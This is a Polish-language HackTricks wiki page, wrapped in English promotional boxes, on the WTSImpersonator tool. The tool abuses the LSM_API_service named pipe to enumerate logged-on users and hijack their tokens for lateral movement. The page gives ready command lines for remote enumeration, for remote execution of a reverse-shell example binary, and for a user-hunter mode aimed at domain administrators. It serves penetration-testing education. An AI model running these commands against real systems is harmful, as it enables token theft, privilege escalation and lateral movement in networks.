{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Narzędzie **WTS Impersonator** wykorzystuje RPC Named pipe **"\\pipe\LSM_API_service"** do cichego enumerowania zalogowanych użytkowników i przejmowania ich tokenów, omijając tradycyjne techniki impersonacji tokenów. Takie podejście ułatwia płynne ruchy lateralne w sieciach. Innowacja stojąca za tą techniką jest przypisywana **Omriemu Baso, którego prace są dostępne na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kluczowa funkcjonalność
Narzędzie działa poprzez sekwencję wywołań API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Kluczowe moduły i użycie
- **Enumeracja użytkowników**: Możliwa jest lokalna i zdalna enumeracja użytkowników za pomocą narzędzia, używając poleceń dla każdego scenariusza:
- Lokalnie:
```powershell
.\WTSImpersonator.exe -m enum
```
- Zdalnie, określając adres IP lub nazwę hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają kontekstu **Usługi** do działania. Lokalna egzekucja wymaga jedynie pliku wykonywalnego WTSImpersonator i polecenia:
- Przykład lokalnej egzekucji polecenia:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe można użyć do uzyskania kontekstu usługi:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalna egzekucja poleceń**: Polega na tworzeniu i instalowaniu usługi zdalnie, podobnie jak PsExec.exe, co pozwala na wykonanie z odpowiednimi uprawnieniami.
- Przykład zdalnej egzekucji:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduł polowania na użytkowników**: Celuje w konkretnych użytkowników na wielu maszynach, wykonując kod pod ich poświadczeniami. Jest to szczególnie przydatne w celu atakowania administratorów domeny z lokalnymi prawami administratora na kilku systemach.
- Przykład użycia:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
